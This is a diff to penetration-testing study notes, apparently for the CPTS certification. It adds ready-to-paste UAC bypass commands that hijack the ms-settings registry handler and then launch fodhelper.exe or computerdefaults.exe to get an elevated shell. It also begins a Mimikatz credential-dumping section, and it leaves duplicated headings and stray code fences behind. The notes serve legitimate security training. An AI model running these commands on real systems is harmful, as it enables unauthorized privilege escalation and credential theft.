@@ -355,47 +355,67 @@ reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute 
 > [!important]  
 > `fodhelper.exe` and `computerdefaults.exe` are legitimate Windows executables that can be abused through **per-user registry modifications** to bypass UAC.
 
-### 🧠 Important Verification
+🚨Bypass UAC
 
-Running:
+> [!info]  
+> **Goal:** Bypass **User Account Control (UAC)** to execute a command with elevated Administrator privileges.
+
+### 🔓 Method 1 — `fodhelper.exe`
 
 ```cmd
-whoami
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
 ```
 
-may still return:
+**What happens:**
 
 ```text
-mcharles
+HKCU registry modification
+        ↓
+ms-settings handler hijacked
+        ↓
+fodhelper.exe launched
+        ↓
+UAC bypass
+        ↓
+cmd.exe executes elevated
 ```
 
-This is because the **username itself does not change**. The important difference is the **integrity/elevation level** of the process.
+### 🔓 Method 2 — `computerdefaults.exe`
 
-```text
-mcharles
-   │
-   └── UAC bypass
-          ↓
-   Elevated Administrator context
-          ↓
-   Access to protected locations
+```cmd
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
 ```
 
-> [!warning]  
-> **`whoami` alone is not sufficient to prove that UAC bypass succeeded.** Verify the process's elevation/integrity level and whether you can access Administrator-protected resources.
+> [!important]  
+> `fodhelper.exe` and `computerdefaults.exe` are legitimate Windows executables that can be abused through **per-user registry modifications** to bypass UAC.
 
-### 🎯 CPTS Memory
+
+```
+# 🔓 11. Mimikatz `sekurlsa::credman`
+
+Start Mimikatz:
+
+```cmd
+C:\Users\Administrator\Desktop> mimikatz.exe
+```
+
+Then enable the privileges required for credential extraction:
 
 ```text
-UAC Bypass
-   ↓
-Modify HKCU\Software\Classes\ms-settings
-   ↓
-Launch fodhelper.exe / computerdefaults.exe
-   ↓
-Elevated command execution
-   ↓
-Administrator-level access
+mimikatz # privilege::debug
+Privilege '20' OK
+```
+
+Next, use:
+
+```text
+mimikatz # sekurlsa::credman
+```
+
+
+
+---
+
 ```
 # 🔓 11. Mimikatz `sekurlsa::credman`
 
